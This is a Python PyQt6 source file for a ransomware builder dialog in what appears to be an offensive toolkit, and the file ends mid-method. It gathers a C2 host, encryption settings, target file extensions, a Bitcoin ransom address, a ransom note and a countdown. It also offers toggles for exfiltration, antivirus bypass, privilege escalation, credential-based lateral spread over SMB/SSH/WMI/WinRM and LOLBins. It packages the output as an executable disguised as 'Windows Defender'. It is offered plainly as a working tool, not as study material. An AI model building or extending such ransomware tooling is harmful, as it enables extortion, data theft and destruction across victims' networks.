# widgets/ransomware_dialog.py

from PyQt6.QtWidgets import (
    QDialog, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
    QPushButton, QTextEdit, QGroupBox, QFormLayout,
    QMessageBox, QWidget, QTabWidget, QCheckBox,
    QSpinBox, QComboBox, QFileDialog, QApplication,
    QProgressBar, QSplitter, QGridLayout
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt6.QtGui import QFont, QColor, QTextCursor, QIcon

import os
import subprocess
import threading
from pathlib import Path


class RansomwareBuildWorker(QThread):
    """Worker thread untuk build ransomware"""
    output = pyqtSignal(str)
    finished = pyqtSignal(bool, str, str)
    progress = pyqtSignal(int)

    def __init__(self, options, output_path):
        super().__init__()
        self.options = options
        self.output_path = output_path
        self._stop = False
        self.decrypt_key = ""

    def stop(self):
        self._stop = True

    def run(self):
        try:
            from modules.payload.ransomware_builder import RansomwareBuilder

            self.output.emit("[*] Building ransomware payload...")
            self.progress.emit(10)

            self.output.emit("[*] Generating base payload...")
            self.progress.emit(20)

            builder = RansomwareBuilder()
            result = builder.generate_payload(
                self.options["LHOST"],
                self.options["LPORT"],
                self.options["ENCRYPTION"],
                self.options["EXTENSIONS"],
                self.options["RANSOM_NOTE"],
                self.options["BTC_ADDRESS"],
                self.options["WALLPAPER"],
                self.options.get("COUNTDOWN_SECONDS", 300),
                self.options.get("EXFILTRATE_FILES", True),
                self.options.get("MAX_FILE_SIZE_MB", 10),
                self.options.get("GUI_MODE", True),
                self.options.get("DECRYPT_KEY", ""),
                self.options.get("AV_BYPASS", True),
                self.options.get("PRIVILEGE_ESCALATION", True),
                self.options.get("PARALLEL_ENCRYPTION", True),
                self.options.get("THREAD_COUNT", 4),
                self.options.get("TARGET_OS", "all"),
                self.options.get("LATERAL_MOVEMENT", True),
                self.options.get("LOLBINS", True),
                self.options.get("SPREAD_METHODS", "all"),
                self.options.get("TARGET_SUBNETS", "192.168.1.0/24,10.0.0.0/24"),
                self.options.get("MAX_SPREAD_HOSTS", 10),
                self.options.get("USE_CREDENTIALS", True)
            )

            self.decrypt_key = result.get("decrypt_key", "Unknown")

            self.progress.emit(40)
            self.output.emit("[+] Payload generated successfully")
            self.output.emit(f"[+] Decryption Key: {self.decrypt_key}")

            output_format = self.options.get("OUTPUT_FORMAT", "python")
            base_filename = self.options.get("FULL_FILENAME", "payload")
            target_os = self.options.get("TARGET_OS", "all")

            # Tentukan nama file output
            if output_format == "python":
                full_filename = base_filename
            else:
                # EXE: biarkan PyInstaller yang menentukan ekstensi
                full_filename = base_filename

            self.output.emit(f"[*] Output: {full_filename}")

            if output_format == "exe":
                self.output.emit("[*] Building EXE with PyInstaller...")
                self.progress.emit(50)
                self.output.emit("[*] This may take a moment...")
                self.output.emit(f"[*] Path: {self.output_path}")
                self.output.emit(f"[*] Target OS: {target_os}")
                self.output.emit(f"[*] Decryption Key: {self.decrypt_key}")

                icon_path = self.options.get("ICON_PATH", "")
                icon_file = icon_path if icon_path and os.path.exists(icon_path) else None

                # Gunakan base_filename tanpa ekstensi
                exe_path, error = builder.build_exe(
                    result["script"],
                    base_filename,  # Tanpa ekstensi, PyInstaller akan menambahkan sesuai OS
                    icon_file,
                    output_dir=self.output_path,
                    target_os=target_os
                )

                if exe_path:
                    self.output.emit(f"[+] EXE built successfully!")
                    self.output.emit(f"[+] Location: {exe_path}")
                    self.output.emit(f"[+] Size: {os.path.getsize(exe_path):,} bytes")
                    self.output.emit(f"[+] Target OS: {target_os}")
                    self.output.emit(f"[+] Decryption Key: {self.decrypt_key}")
                    self.progress.emit(100)
                    self.finished.emit(True, exe_path, "EXE")
                    return
                else:
                    self.output.emit(f"[!] EXE failed: {error}")
                    self.output.emit("[!] Falling back to Python payload")
                    self.finished.emit(True, result["python"], "Python (EXE fallback)")
                    return

            else:
                self.output.emit("[*] Saving Python payload...")
                self.output.emit(f"[*] Output: {full_filename}")
                self.output.emit(f"[*] Path: {self.output_path}")
                self.output.emit(f"[*] Decryption Key: {self.decrypt_key}")

                py_path = os.path.join(self.output_path, full_filename + ".py")

                try:
                    with open(py_path, 'w', encoding='utf-8') as f:
                        f.write(result["python"])
                    self.output.emit(f"[+] Python payload saved!")
                    self.output.emit(f"[+] Location: {py_path}")
                    self.output.emit(f"[+] Size: {os.path.getsize(py_path):,} bytes")
                    self.output.emit(f"[+] Decryption Key: {self.decrypt_key}")
                    self.progress.emit(100)
                    self.finished.emit(True, py_path, "Python")
                    return
                except Exception as e:
                    self.output.emit(f"[!] Failed to save: {e}")
                    self.finished.emit(False, str(e), "Error")
                    return

        except Exception as e:
            self.output.emit(f"[!] Error: {str(e)}")
            import traceback
            self.output.emit(f"[!] {traceback.format_exc()}")
            self.finished.emit(False, str(e), "Error")


class RansomwareDialog(QDialog):
    """Dialog untuk Ransomware Builder - Compact UI"""

    def __init__(self, framework=None, parent=None):
        super().__init__(parent)
        self.framework = framework
        self.setWindowTitle("☠ Ransomware Builder")
        self.setModal(False)
        self.setMinimumSize(900, 800)

        self.worker = None
        self.output_dir = str(Path.home() / "lazyframework_payloads")
        self.current_key = ""
        self._build_ui()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(6)
        layout.setContentsMargins(8, 8, 8, 8)

        # ── Title Bar ──
        title_widget = QWidget()
        title_widget.setFixedHeight(40)
        title_widget.setStyleSheet("""
            QWidget {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #1a0000, stop:0.5 #2a0000, stop:1 #1a0000);
                border-radius: 4px;
            }
        """)
        title_layout = QHBoxLayout(title_widget)
        title_layout.setContentsMargins(15, 5, 15, 5)

        title = QLabel("☠ RANSOMWARE BUILDER")
        title.setStyleSheet("color: #ff0000; font-size: 16pt; font-weight: bold;")
        title_layout.addWidget(title)
        title_layout.addStretch()

        self.status_indicator = QLabel("● Ready")
        self.status_indicator.setStyleSheet("color: #50fa7b; font-size: 10pt; font-weight: bold;")
        title_layout.addWidget(self.status_indicator)

        layout.addWidget(title_widget)

        # ── Warning ──
        warning = QLabel("⚠️ HACK THE PLANET ⚠️")
        warning.setStyleSheet("""
            color: #ffff00;
            font-size: 10pt;
            font-weight: bold;
            padding: 4px;
            background: #1a0a0a;
            border: 1px solid #ff0000;
            border-radius: 4px;
        """)
        warning.setAlignment(Qt.AlignmentFlag.AlignCenter)
        warning.setFixedHeight(30)
        layout.addWidget(warning)

        # ── Main Split ──
        main_split = QSplitter(Qt.Orientation.Horizontal)
        main_split.setSizes([480, 420])

        left_panel = self._build_config_panel()
        main_split.addWidget(left_panel)

        right_panel = self._build_output_panel()
        main_split.addWidget(right_panel)

        layout.addWidget(main_split)

        # ── Progress Bar ──
        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setValue(0)
        self.progress_bar.setFixedHeight(18)
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                border: 1px solid #00ff00;
                border-radius: 3px;
                background: #0a0a0a;
                text-align: center;
                color: #00ff00;
                font-family: 'Consolas', monospace;
                font-weight: bold;
            }

            QProgressBar::chunk {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #00ff00,
                    stop:0.3 #44ff44,
                    stop:0.7 #44ff44,
                    stop:1 #00ff00);
                border-radius: 2px;
                border: 1px solid #00ff00;
            }
        """)
        layout.addWidget(self.progress_bar)

        # ── Action Buttons ──
        btn_layout = QHBoxLayout()
        btn_layout.setSpacing(6)

        self.generate_btn = QPushButton("🚀 Build")
        self.generate_btn.setMinimumHeight(36)
        self.generate_btn.setStyleSheet("""
            QPushButton {
                background: #ff0000;
                color: white;
                font-weight: bold;
                font-size: 11pt;
                padding: 6px 16px;
                border: none;
                border-radius: 4px;
            }
            QPushButton:hover { background: #cc0000; }
            QPushButton:disabled { background: #555555; color: #888888; }
        """)
        self.generate_btn.clicked.connect(self._generate)
        btn_layout.addWidget(self.generate_btn, 1)

        self.stop_btn = QPushButton("⏹ Stop")
        self.stop_btn.setMinimumHeight(36)
        self.stop_btn.setStyleSheet("""
            QPushButton {
                background: #555555;
                color: white;
                font-weight: bold;
                padding: 6px 14px;
                border: none;
                border-radius: 4px;
            }
            QPushButton:hover { background: #777777; }
            QPushButton:disabled { background: #333333; color: #666666; }
        """)
        self.stop_btn.clicked.connect(self._stop_generation)
        self.stop_btn.setEnabled(False)
        btn_layout.addWidget(self.stop_btn)

        btn_layout.addStretch()

        self.copy_btn = QPushButton("📋 Copy")
        self.copy_btn.setMinimumHeight(36)
        self.copy_btn.setStyleSheet("""
            QPushButton {
                background: #1f6feb;
                color: white;
                font-weight: bold;
                padding: 6px 14px;
                border: none;
                border-radius: 4px;
            }
            QPushButton:hover { background: #388bfd; }
        """)
        self.copy_btn.clicked.connect(self._copy_output)
        btn_layout.addWidget(self.copy_btn)

        self.open_folder_btn = QPushButton("📂 Open Folder")
        self.open_folder_btn.setMinimumHeight(36)
        self.open_folder_btn.setStyleSheet("""
            QPushButton {
                background: #238636;
                color: white;
                font-weight: bold;
                padding: 6px 14px;
                border: none;
                border-radius: 4px;
            }
            QPushButton:hover { background: #2ea043; }
        """)
        self.open_folder_btn.clicked.connect(self._open_output_folder)
        btn_layout.addWidget(self.open_folder_btn)

        layout.addLayout(btn_layout)

    def _build_config_panel(self):
        """Build left panel - Configuration (Compact)"""
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setSpacing(4)
        layout.setContentsMargins(4, 4, 4, 4)

        # ── Connection Settings ──
        conn_group = QGroupBox("🌐 Connection Settings")
        conn_group.setStyleSheet(self._group_style("#00ff00"))
        conn_layout = QFormLayout()
        conn_layout.setSpacing(4)
        conn_layout.setContentsMargins(8, 10, 8, 4)

        self.lhost_input = QLineEdit()
        self.lhost_input.setText("127.0.0.1")
        self.lhost_input.setPlaceholderText("C2 IP")
        self.lhost_input.setFixedHeight(26)
        self.lhost_input.setStyleSheet(self._input_style())
        conn_layout.addRow("Host:", self.lhost_input)

        self.lport_input = QLineEdit()
        self.lport_input.setText("4444")
        self.lport_input.setPlaceholderText("Port")
        self.lport_input.setFixedHeight(26)
        self.lport_input.setStyleSheet(self._input_style())
        conn_layout.addRow("Port:", self.lport_input)

        conn_group.setLayout(conn_layout)
        layout.addWidget(conn_group)

        # ── Payload Settings ──
        payload_group = QGroupBox("⚡ Payload")
        payload_group.setStyleSheet(self._group_style("#ffaa00"))
        payload_layout = QFormLayout()
        payload_layout.setSpacing(3)
        payload_layout.setContentsMargins(8, 10, 8, 4)

        self.encryption_combo = QComboBox()
        self.encryption_combo.addItems(["xchacha20", "aes256", "chacha20", "xor", "rc4"])
        self.encryption_combo.setCurrentText("xchacha20")
        self.encryption_combo.setFixedHeight(26)
        self.encryption_combo.setStyleSheet(self._combo_style())
        payload_layout.addRow("Encryption:", self.encryption_combo)

        self.extensions_input = QLineEdit()
        self.extensions_input.setText("txt,doc,pdf,jpg,png,xlsx")
        self.extensions_input.setPlaceholderText("Extensions")
        self.extensions_input.setFixedHeight(26)
        self.extensions_input.setStyleSheet(self._input_style())
        payload_layout.addRow("Extensions:", self.extensions_input)

        self.btc_input = QLineEdit()
        self.btc_input.setText("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
        self.btc_input.setPlaceholderText("BTC Address")
        self.btc_input.setFixedHeight(26)
        self.btc_input.setStyleSheet(self._input_style())
        payload_layout.addRow("BTC:", self.btc_input)

        # ── SpinBoxes ──
        self.thread_spin = QSpinBox()
        self.thread_spin.setRange(1, 32)
        self.thread_spin.setValue(4)
        self.thread_spin.setFixedHeight(26)
        self.thread_spin.setStyleSheet(self._input_style())
        payload_layout.addRow("Threads:", self.thread_spin)

        self.max_size_spin = QSpinBox()
        self.max_size_spin.setRange(1, 100)
        self.max_size_spin.setValue(10)
        self.max_size_spin.setSuffix(" MB")
        self.max_size_spin.setFixedHeight(26)
        self.max_size_spin.setStyleSheet(self._input_style())
        payload_layout.addRow("Max Size:", self.max_size_spin)

        self.countdown_spin = QSpinBox()
        self.countdown_spin.setRange(10, 3600)
        self.countdown_spin.setValue(300)
        self.countdown_spin.setSuffix(" s")
        self.countdown_spin.setFixedHeight(26)
        self.countdown_spin.setStyleSheet(self._input_style())
        payload_layout.addRow("Countdown:", self.countdown_spin)

        self.decrypt_key_input = QLineEdit()
        self.decrypt_key_input.setPlaceholderText("Auto-generate")
        self.decrypt_key_input.setFixedHeight(26)
        self.decrypt_key_input.setStyleSheet(self._input_style())
        payload_layout.addRow("Decrypt Key:", self.decrypt_key_input)

        payload_group.setLayout(payload_layout)
        layout.addWidget(payload_group)

        # ── Output Format ──
        format_group = QGroupBox("📦 Output")
        format_group.setStyleSheet(self._group_style("#00ffff"))
        format_layout = QFormLayout()
        format_layout.setSpacing(3)
        format_layout.setContentsMargins(8, 10, 8, 4)

        # Format Combo
        self.format_combo = QComboBox()
        self.format_combo.addItems(["Python (.py)", "EXE"])
        self.format_combo.setFixedHeight(26)
        self.format_combo.setStyleSheet(self._combo_style())
        self.format_combo.currentTextChanged.connect(self._on_format_changed)
        format_layout.addRow("Format:", self.format_combo)

        # Target OS Combo
        self.target_os_combo = QComboBox()
        self.target_os_combo.addItems(["all", "windows", "linux", "macos"])
        self.target_os_combo.setFixedHeight(26)
        self.target_os_combo.setStyleSheet(self._combo_style())
        format_layout.addRow("Target OS:", self.target_os_combo)

        # Output Path
        path_layout = QHBoxLayout()
        self.output_path_input = QLineEdit()
        self.output_path_input.setText(self.output_dir)
        self.output_path_input.setPlaceholderText("Output dir")
        self.output_path_input.setFixedHeight(26)
        self.output_path_input.setStyleSheet(self._input_style())
        path_layout.addWidget(self.output_path_input, 3)

        self.browse_btn = QPushButton("📂")
        self.browse_btn.setFixedSize(30, 26)
        self.browse_btn.setStyleSheet("""
            QPushButton {
                background: #1f6feb;
                color: white;
                font-weight: bold;
                border: none;
                border-radius: 3px;
            }
            QPushButton:hover { background: #388bfd; }
        """)
        self.browse_btn.clicked.connect(self._browse_output_folder)
        path_layout.addWidget(self.browse_btn)
        format_layout.addRow("Path:", path_layout)

        # File Name
        self.file_name_input = QLineEdit()
        self.file_name_input.setText("Windows Defender")
        self.file_name_input.setPlaceholderText("File name (without extension)")
        self.file_name_input.setFixedHeight(26)
        self.file_name_input.setStyleSheet(self._input_style())
        format_layout.addRow("Name:", self.file_name_input)

        # Icon Path (hanya untuk EXE)
        icon_layout = QHBoxLayout()
        self.icon_path_input = QLineEdit()
        self.icon_path_input.setPlaceholderText("Icon path (optional)")
        self.icon_path_input.setFixedHeight(26)
        self.icon_path_input.setStyleSheet(self._input_style())
        icon_layout.addWidget(self.icon_path_input, 3)

        self.icon_browse_btn = QPushButton("📂")
        self.icon_browse_btn.setFixedSize(30, 26)
        self.icon_browse_btn.setStyleSheet("""
            QPushButton {
                background: #1f6feb;
                color: white;
                font-weight: bold;
                border: none;
                border-radius: 3px;
            }
            QPushButton:hover { background: #388bfd; }
        """)
        self.icon_browse_btn.clicked.connect(self._browse_icon)
        icon_layout.addWidget(self.icon_browse_btn)
        format_layout.addRow("Icon:", icon_layout)

        # Status info
        self.format_status = QLabel("✅ Python - runs with python3")
        self.format_status.setStyleSheet("color: #50fa7b; font-size: 8pt; padding: 2px;")
        format_layout.addRow("", self.format_status)

        format_group.setLayout(format_layout)
        layout.addWidget(format_group)

        # ── Ransom Note ──
        note_group = QGroupBox("📝 Note")
        note_group.setStyleSheet(self._group_style("#ff79c6"))
        note_layout = QVBoxLayout()
        note_layout.setSpacing(2)
        note_layout.setContentsMargins(8, 10, 8, 4)

        self.note_input = QTextEdit()
        self.note_input.setPlaceholderText("Ransom note...")
        self.note_input.setMaximumHeight(80)
        self.note_input.setStyleSheet(self._textarea_style())
        note_layout.addWidget(self.note_input)

        note_group.setLayout(note_layout)
        layout.addWidget(note_group)

        layout.addStretch()
        return panel

    def _build_output_panel(self):
        """Build right panel - Output dengan Checkbox di bawah Console"""
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setSpacing(4)
        layout.setContentsMargins(4, 4, 4, 4)

        # ── Console Output ──
        console_label = QLabel("📟 Process:")
        console_label.setStyleSheet("font-weight: bold; color: #00ff00; font-size: 10pt;")
        layout.addWidget(console_label)

        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setFont(QFont("Consolas", 9))
        self.output_text.setMinimumHeight(100)
        self.output_text.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 4px;
                padding: 6px;
                font-family: 'Consolas', monospace;
                font-size: 9pt;
            }
        """)
        layout.addWidget(self.output_text)

        # ── Checkbox Section (DI BAWAH CONSOLE) ──
        checkbox_group = QGroupBox("⚙️ Options")
        checkbox_group.setStyleSheet("""
            QGroupBox {
                color: #00ffff;
                border: 1px solid #333333;
                border-radius: 4px;
                margin-top: 8px;
                padding-top: 12px;
                font-weight: bold;
                font-size: 9pt;
                background: #0a0a0a;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 8px;
                padding: 0 8px;
                color: #00ffff;
                background: #0a0a0a;
            }
        """)
        checkbox_layout = QVBoxLayout()
        checkbox_layout.setSpacing(4)
        checkbox_layout.setContentsMargins(8, 8, 8, 8)

        # Row 1: Wallpaper & Exfiltrate
        row1 = QHBoxLayout()
        row1.setSpacing(15)

        self.wallpaper_cb = QCheckBox("🖼️ Wallpaper")
        self.wallpaper_cb.setChecked(True)
        self.wallpaper_cb.setToolTip("Change Wallpaper")
        self.wallpaper_cb.setStyleSheet("color: #cccccc; font-size: 9pt;")
        row1.addWidget(self.wallpaper_cb)

        self.exfiltrate_cb = QCheckBox("📤 Exfiltrate")
        self.exfiltrate_cb.setChecked(True)
        self.exfiltrate_cb.setToolTip("Exfiltrate Files")
        self.exfiltrate_cb.setStyleSheet("color: #cccccc; font-size: 9pt;")
        row1.addWidget(self.exfiltrate_cb)

        self.gui_cb = QCheckBox("🖥️ GUI")
        self.gui_cb.setChecked(True)
        self.gui_cb.setToolTip("GUI Mode")
        self.gui_cb.setStyleSheet("color: #cccccc; font-size: 9pt;")
        row1.addWidget(self.gui_cb)

        row1.addStretch()
        checkbox_layout.addLayout(row1)

        # Row 2: AV Bypass & Priv Esc
        row2 = QHBoxLayout()
        row2.setSpacing(15)

        self.av_bypass_cb = QCheckBox("🛡️ AV Bypass")
        self.av_bypass_cb.setChecked(True)
        self.av_bypass_cb.setToolTip("AV Bypass")
        self.av_bypass_cb.setStyleSheet("color: #cccccc; font-size: 9pt;")
        row2.addWidget(self.av_bypass_cb)

        self.priv_esc_cb = QCheckBox("⬆️ Priv Esc")
        self.priv_esc_cb.setChecked(True)
        self.priv_esc_cb.setToolTip("Privilege Escalation")
        self.priv_esc_cb.setStyleSheet("color: #cccccc; font-size: 9pt;")
        row2.addWidget(self.priv_esc_cb)

        self.parallel_cb = QCheckBox("⚡ Parallel")
        self.parallel_cb.setChecked(True)
        self.parallel_cb.setToolTip("Parallel Encryption")
        self.parallel_cb.setStyleSheet("color: #cccccc; font-size: 9pt;")
        row2.addWidget(self.parallel_cb)

        row2.addStretch()
        checkbox_layout.addLayout(row2)

        # Row 3: Lateral Movement & LOLBins
        row3 = QHBoxLayout()
        row3.setSpacing(15)

        self.lateral_cb = QCheckBox("🔄 Lateral")
        self.lateral_cb.setChecked(True)
        self.lateral_cb.setToolTip("Enable Lateral Movement")
        self.lateral_cb.setStyleSheet("color: #cccccc; font-size: 9pt;")
        row3.addWidget(self.lateral_cb)

        self.lolbins_cb = QCheckBox("🔧 LOLBins")
        self.lolbins_cb.setChecked(True)
        self.lolbins_cb.setToolTip("Use LOLBins (Stealth)")
        self.lolbins_cb.setStyleSheet("color: #cccccc; font-size: 9pt;")
        row3.addWidget(self.lolbins_cb)

        self.use_creds_cb = QCheckBox("🔑 Creds")
        self.use_creds_cb.setChecked(True)
        self.use_creds_cb.setToolTip("Use Harvested Credentials")
        self.use_creds_cb.setStyleSheet("color: #cccccc; font-size: 9pt;")
        row3.addWidget(self.use_creds_cb)

        row3.addStretch()
        checkbox_layout.addLayout(row3)

        # Row 4: Spread Methods & Max Hosts (inline)
        row4 = QHBoxLayout()
        row4.setSpacing(10)

        row4.addWidget(QLabel("Spread:"))
        row4.addWidget(QLabel("Methods:"))
        self.spread_methods_combo = QComboBox()
        self.spread_methods_combo.addItems(["all", "smb", "ssh", "wmi", "winrm"])
        self.spread_methods_combo.setFixedHeight(24)
        self.spread_methods_combo.setStyleSheet(self._combo_style())
        row4.addWidget(self.spread_methods_combo)

        row4.addSpacing(10)
        row4.addWidget(QLabel("Max:"))
        self.max_hosts_spin = QSpinBox()
        self.max_hosts_spin.setRange(0, 100)
        self.max_hosts_spin.setValue(10)
        self.max_hosts_spin.setSuffix(" hosts")
        self.max_hosts_spin.setFixedHeight(24)
        self.max_hosts_spin.setStyleSheet(self._input_style())
        self.max_hosts_spin.setMaximumWidth(100)
        row4.addWidget(self.max_hosts_spin)

        row4.addStretch()
        checkbox_layout.addLayout(row4)

        checkbox_group.setLayout(checkbox_layout)
        layout.addWidget(checkbox_group)

        # ── Decryption Key ──
        key_label = QLabel("🔑 Key:")
        key_label.setStyleSheet("font-weight: bold; color: #ffff00; font-size: 10pt;")
        layout.addWidget(key_label)

        self.key_display = QTextEdit()
        self.key_display.setReadOnly(True)
        self.key_display.setFont(QFont("Consolas", 11))
        self.key_display.setMaximumHeight(40)
        self.key_display.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                color: #00ff00;
                border: 1px solid #00ff00;
                border-radius: 4px;
                padding: 6px;
                font-family: 'Consolas', monospace;
                font-size: 11pt;
            }
        """)
        self.key_display.setPlainText("Waiting...")
        layout.addWidget(self.key_display)

        # ── Generated Payload ──
        payload_label = QLabel("💾 Payload:")
        payload_label.setStyleSheet("font-weight: bold; color: #ffff00; font-size: 10pt;")
        layout.addWidget(payload_label)

        self.payload_text = QTextEdit()
        self.payload_text.setReadOnly(True)
        self.payload_text.setFont(QFont("Consolas", 9))
        self.payload_text.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 4px;
                padding: 6px;
                font-family: 'Consolas', monospace;
                font-size: 9pt;
            }
        """)
        layout.addWidget(self.payload_text)

        return panel

    # ─── Event Handlers ────────────────────────────────────────────────────

    def _browse_output_folder(self):
        folder = QFileDialog.getExistingDirectory(
            self,
            "Select Output Directory",
            self.output_path_input.text() or str(Path.home())
        )
        if folder:
            self.output_path_input.setText(folder)

    def _browse_icon(self):
        filepath, _ = QFileDialog.getOpenFileName(
            self,
            "Select Icon File",
            str(Path.home()),
            "Icon Files (*.ico *.png *.jpg *.jpeg);;All Files (*.*)"
        )
        if filepath:
            self.icon_path_input.setText(filepath)

    def _update_exe_status(self):
        """Update status EXE saat target OS atau nama file berubah"""
        target_os = self.target_os_combo.currentText()
        os_display = {
            "windows": "Windows (.exe)",
            "macos": "macOS (.app bundle)",
            "linux": "Linux (no extension)"
        }
        file_name = self.file_name_input.text().strip() or "Windows Defender"
        ext = {
            "windows": ".exe",
            "macos": ".app",
            "linux": ""
        }.get(target_os, "")
        
        if ext:
            display_name = file_name + ext
        else:
            display_name = file_name
        
        self.format_status.setText(f"🔨 EXE - {os_display.get(target_os, 'EXE')} → {display_name}")
        self.format_status.setStyleSheet("color: #ffaa00; font-size: 8pt; padding: 2px;")

    def _on_format_changed(self, format_name):
        """Handle format change - FIXED"""
        if "EXE" in format_name:
            # Update status
            self._update_exe_status()
            
            self.file_name_input.setText("Windows Defender")
            self.icon_path_input.setEnabled(True)
            self.icon_browse_btn.setEnabled(True)
            self.target_os_combo.setEnabled(True)
            
            # ===== FIX: Connect untuk update real-time =====
            try:
                self.target_os_combo.currentTextChanged.disconnect(self._update_exe_status)
            except:
                pass
            self.target_os_combo.currentTextChanged.connect(self._update_exe_status)
            
            try:
                self.file_name_input.textChanged.disconnect(self._update_exe_status)
            except:
                pass
            self.file_name_input.textChanged.connect(self._update_exe_status)
            
        else:
            self.format_status.setText("✅ Python - runs with python3")
            self.format_status.setStyleSheet("color: #50fa7b; font-size: 8pt; padding: 2px;")
            self.file_name_input.setText("Windows Defender")
            self.icon_path_input.setEnabled(False)
            self.icon_browse_btn.setEnabled(False)
            self.target_os_combo.setEnabled(False)
            
            try:
                self.target_os_combo.currentTextChanged.disconnect(self._update_exe_status)
            except:
                pass
            try:
                self.file_name_input.textChanged.disconnect(self._update_exe_status)
            except:
                pass

    def _generate(self):
        """Generate payload - FIXED"""
        format_map = {"Python (.py)": "python", "EXE (PyInstaller)": "exe"}

        output_dir = self.output_path_input.text().strip()
        if not output_dir:
            output_dir = self.output_dir

        try:
            os.makedirs(output_dir, exist_ok=True)
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Cannot create directory:\n{e}")
            return

        file_name = self.file_name_input.text().strip()
        if not file_name:
            file_name = "Windows Defender"

        format_display = self.format_combo.currentText()
        format_type = format_map.get(format_display, "python")
        target_os = self.target_os_combo.currentText()

        # ===== FIX: Tentukan ekstensi untuk display saja =====
        ext_map = {
            "python": ".py",
            "windows": ".exe",
            "macos": ".app",
            "linux": ""
        }
        
        if format_type == "python":
            display_ext = ".py"
        else:
            display_ext = ext_map.get(target_os, "")
        
        # ===== FIX: Tampilkan nama file dengan ekstensi =====
        if display_ext:
            full_filename = file_name + display_ext
        else:
            full_filename = file_name

        options = {
            "LHOST": self.lhost_input.text().strip(),
            "LPORT": int(self.lport_input.text().strip()) if self.lport_input.text().strip() else 4444,
            "ENCRYPTION": self.encryption_combo.currentText(),
            "EXTENSIONS": self.extensions_input.text().strip(),
            "BTC_ADDRESS": self.btc_input.text().strip(),
            "WALLPAPER": self.wallpaper_cb.isChecked(),
            "RANSOM_NOTE": self.note_input.toPlainText().strip() or "YOUR FILES ARE ENCRYPTED!",
            "OUTPUT_FORMAT": format_type,
            "FULL_FILENAME": full_filename,
            "ICON_PATH": self.icon_path_input.text().strip(),
            "COUNTDOWN_SECONDS": self.countdown_spin.value(),
            "EXFILTRATE_FILES": self.exfiltrate_cb.isChecked(),
            "MAX_FILE_SIZE_MB": self.max_size_spin.value(),
            "GUI_MODE": self.gui_cb.isChecked(),
            "DECRYPT_KEY": self.decrypt_key_input.text().strip(),
            "AV_BYPASS": self.av_bypass_cb.isChecked(),
            "PRIVILEGE_ESCALATION": self.priv_esc_cb.isChecked(),
            "PARALLEL_ENCRYPTION": self.parallel_cb.isChecked(),
            "THREAD_COUNT": self.thread_spin.value(),
            "TARGET_OS": target_os,
            "LATERAL_MOVEMENT": self.lateral_cb.isChecked(),
            "LOLBINS": self.lolbins_cb.isChecked(),
            "SPREAD_METHODS": self.spread_methods_combo.currentText(),
            "TARGET_SUBNETS": "192.168.1.0/24,10.0.0.0/24",
            "MAX_SPREAD_HOSTS": self.max_hosts_spin.value(),
            "USE_CREDENTIALS": self.use_creds_cb.isChecked()
        }

        if not options["LHOST"]:
            QMessageBox.warning(self, "Error", "Please enter C2 Host")
            return

        # ===== FIX: Update status dengan ekstensi yang benar =====
        if format_type == "python":
            self.format_status.setText(f"✅ Python - output: {full_filename}")
        else:
            os_display = {
                "windows": "Windows (.exe)",
                "macos": "macOS (.app bundle)", 
                "linux": "Linux (no extension)"
            }
            self.format_status.setText(f"🔨 {os_display.get(target_os, 'EXE')} - output: {full_filename}")

        self.generate_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.copy_btn.setEnabled(False)
        self.status_indicator.setText("● Generating...")
        self.status_indicator.setStyleSheet("color: #ffff00; font-size: 10pt; font-weight: bold;")
        self.progress_bar.setValue(0)
        self.output_text.clear()
        self.payload_text.clear()
        self.key_display.setPlainText("Generating...")

        self.worker = RansomwareBuildWorker(options, output_dir)
        self.worker.output.connect(self._append_output)
        self.worker.progress.connect(self.progress_bar.setValue)
        self.worker.finished.connect(self._on_finished)
        self.worker.start()

    def _stop_generation(self):
        if self.worker and self.worker.isRunning():
            self.worker.stop()
            self.worker.wait(1000)
            self._append_output("[!] Stopped by user")

        self.generate_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.copy_btn.setEnabled(True)
        self.status_indicator.setText("● Stopped")
        self.status_indicator.setStyleSheet("color: #ff5555; font-size: 10pt; font-weight: bold;")

    def _append_output(self, text):
        self.output_text.append(text)
        scrollbar = self.output_text.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())

    def _on_finished(self, success, result, output_type):
        self.generate_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.copy_btn.setEnabled(True)

        if success:
            self.status_indicator.setText("● Completed")
            self.status_indicator.setStyleSheet("color: #50fa7b; font-size: 10pt; font-weight: bold;")
            self._append_output(f"[+] Success! {output_type}")
            self.payload_text.setPlainText(result)
            self.progress_bar.setValue(100)

            if hasattr(self, 'worker') and self.worker and self.worker.decrypt_key:
                self.current_key = self.worker.decrypt_key
                self.key_display.setPlainText(f"🔑 {self.current_key}")
                self.key_display.setStyleSheet("""
                    QTextEdit {
                        background: #0d1117;
                        color: #00ff00;
                        border: 2px solid #00ff00;
                        border-radius: 4px;
                        padding: 6px;
                        font-family: 'Consolas', monospace;
                        font-size: 12pt;
                        font-weight: bold;
                    }
                """)
            else:
                self.key_display.setPlainText("🔑 Key saved in file")

            QMessageBox.information(
                self, "Success",
                f"{output_type} generated!\n\n"
                f"Location: {result}"
            )
        else:
            self.status_indicator.setText("● Failed")
            self.status_indicator.setStyleSheet("color: #ff5555; font-size: 10pt; font-weight: bold;")
            self._append_output(f"[!] Failed: {result}")
            self.key_display.setPlainText("❌ Failed")
            QMessageBox.critical(self, "Error", f"Generation failed:\n{result}")

    def _copy_output(self):
        text = self.payload_text.toPlainText()
